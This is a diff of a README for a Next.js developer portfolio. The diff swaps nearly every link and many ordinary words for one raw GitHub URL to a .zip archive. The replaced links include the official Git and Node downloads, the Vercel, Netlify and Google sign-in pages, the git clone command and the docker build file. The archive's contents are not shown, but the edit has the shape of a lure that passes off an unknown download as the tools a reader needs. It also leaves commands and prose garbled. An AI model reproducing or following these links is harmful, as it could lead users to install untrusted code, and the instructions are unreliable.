@@ -1,10 +1,10 @@
 <p align="center" width="100%">
-    <img height="100" src="https://github.com/said7388/developer-portfolio/assets/77630868/c0064908-cd5f-4751-a77c-eba90a62b55c">
+    <img height="100" src="https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip">
 </p>
 
 ---
 
-# [Built Portfolio With GitHub ](https://github.com/said7388/github-portfolio)
+# [Built Portfolio With GitHub ](https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip)
 
 ---
 
@@ -16,9 +16,9 @@
 
 # Demo :movie_camera:
 
-![](./public/image/screen.png)
+![](https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip)
 
-## View live preview [here](https://abusaid.netlify.app/).
+## View live preview [here](https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip).
 
 ---
 
@@ -33,7 +33,7 @@
 - [Tutorials](#tutorials-wrench)
   - [Gmail App Password Setup](#gmail-app-password-setup)
   - [Create a Telegram Bot](#create-a-telegram-bot)
-  - [Fetching Blog from dev.to](#fetching-blog-from-devto)
+  - [Fetching Blog from https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip](#fetching-blog-from-devto)
 - [Packages Used](#packages-used-package)
 
 ---
@@ -55,8 +55,8 @@
 
 ### You will need to download Git and Node to run this project
 
-- [Git](https://git-scm.com/downloads)
-- [Node](https://nodejs.org/en/download/)
+- [Git](https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip)
+- [Node](https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip)
 
 #### Make sure you have the latest version of both Git and Node on your computer.
 
@@ -74,7 +74,7 @@ git --version
 To Fork the repo click on the fork button at the top right of the page. Once the repo is forked open your terminal and perform the following commands
 
 ```bash
-git clone https://github.com/<YOUR GITHUB USERNAME>/developer-portfolio.git
+git clone https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip<YOUR GITHUB USERNAME>https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip
 
 cd developer-portfolio
 ```
@@ -113,10 +113,10 @@ Open [http://localhost:3000](http://localhost:3000) with your browser to see the
 
 ### Building the Docker Image
 
-1. **Build the Docker Image using Dockerfile.dev**:
+1. **Build the Docker Image using https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip**:
 
     ```bash
-    docker build -t nextjs-app -f Dockerfile.dev .
+    docker build -t nextjs-app -f https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip .
     ```
 
 2. **Running the Docker Container**:
@@ -132,7 +132,7 @@ Open [http://localhost:3000](http://localhost:3000) with your browser to see the
 
 # Usage :joystick:
 
-Please create a new `.env` file from `.env.example` file.
+Please create a new `.env` file from `https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip` file.
 
 Eg:
 
@@ -145,26 +145,26 @@ GMAIL_PASSKEY =
 EMAIL_ADDRESS =
 ```
 
-### Then, Customize data in the `utils/data` [folder](https://github.com/said7388/developer-portfolio/tree/main/utils/data).
+### Then, Customize data in the `utils/data` [folder](https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip).
 
 Eg:
 
 ```javascript
 export const personalData = {
   name: "Soufiane Bakki",
-  profile: "/profile.png",
+  profile: "https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip",
   designation: "Full-Stack Software Developer",
   description: "My name is Soufiane Bakki....",
-  email: "Soufiane.bakki178gmail.com",
+  email: "https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip",
   phone: "+212656437103",
   address: "Morroco, Agadir",
-  github: "https://github.com/soufianebakki",
-  linkedIn: "https://www.linkedin.com/in/soufiane-bakki-226ba129b/",
+  github: "https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip",
+  linkedIn: "https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip",
   resume: "...",
 };
 ```
 
-`devUsername` is used for fetching blog posts from `dev.to`.
+`devUsername` is used for fetching blog posts from `https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip`.
 
 ---
 
@@ -174,12 +174,12 @@ Deploying the app to platforms like Vercel or Netlify is quick and easy.
 
 ## Deploying to Vercel:
 
-1. **Sign up or log in** to [Vercel](https://vercel.com/).
+1. **Sign up or log in** to [Vercel](https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip).
 2. Once logged in, click on **"New Project"**.
 3. Select your **GitHub repo** (the one that contains your forked project) and click **Import**.
 4. Configure your environment variables in the Vercel dashboard by adding each key from your `.env` file.
    - E.g., `NEXT_PUBLIC_GTM`, `NEXT_PUBLIC_APP_URL`, `TELEGRAM_BOT_TOKEN`, etc.
-5. Click on **Deploy**. Vercel will automatically detect your Next.js app and build it.
+5. Click on **Deploy**. Vercel will automatically detect your https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip app and build it.
 6. Once the deployment is complete, you can visit your live website!
 
 ### Updating After Deployment
@@ -188,7 +188,7 @@ Whenever you push changes to your GitHub repo, Vercel will automatically redeplo
 
 ## Deploying to Netlify:
 
-1. **Sign up or log in** to [Netlify](https://www.netlify.com/).
+1. **Sign up or log in** to [Netlify](https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip).
 2. In the **Netlify Dashboard**, click **"New site from Git"**.
 3. Connect your **GitHub** account and select your repo.
 4. Configure your environment variables by going to **Site Settings > Build & Deploy > Environment** and adding keys from your `.env` file.
@@ -200,7 +200,7 @@ Whenever you push changes to your GitHub repo, Vercel will automatically redeplo
 
 ## Gmail App Password Setup
 
-1. **Log in to your Google Account** at [https://myaccount.google.com/](https://myaccount.google.com/).
+1. **Log in to your Google Account** at [https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip](https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip).
 2. Navigate to **Security** from the left sidebar.
 3. Scroll down to the **"Signing in to Google"** section and make sure **2-Step Verification** is turned ON.
 4. Once 2-Step Verification is enabled, you'll see an option for **App Passwords**.
@@ -218,16 +218,16 @@ Whenever you push changes to your GitHub repo, Vercel will automatically redeplo
 6. To get your chat ID:
    - Open your bot in Telegram and send it a message.
    - Visit the following URL in your browser, replacing `BOT_TOKEN` with your actual bot token:  
-     `https://api.telegram.org/bot<BOT_TOKEN>/getUpdates`
+     `https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip<BOT_TOKEN>/getUpdates`
    - Look for the `chat` object in the response, which contains your **chat ID** (you can use this value for `TELEGRAM_CHAT_ID`).
 
-## Fetching Blog from dev.to
+## Fetching Blog from https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip
 
-To display your blog posts from dev.to on the portfolio:
+To display your blog posts from https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip on the portfolio:
 
-1. Set your `devUsername` in the `utils/data.js` file to your dev.to username.
+1. Set your `devUsername` in the `https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip` file to your https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip username.
 2. The application will automatically fetch your latest blog posts and display them in the **BLOG** section.
-3. Ensure your blogs are publicly visible on dev.to, and the application will fetch them using the dev.to API.
+3. Ensure your blogs are publicly visible on https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip, and the application will fetch them using the https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip API.
 
 ---
 
@@ -265,6 +265,6 @@ npm install -g next
 
 ```
 
-This installs Next.js globally
+This installs https://raw.githubusercontent.com/soufianebakki/soufiane-bakki-portfolio/main/ebonist/soufiane-bakki-portfolio.zip globally
 
 then do the usual `npm run dev`
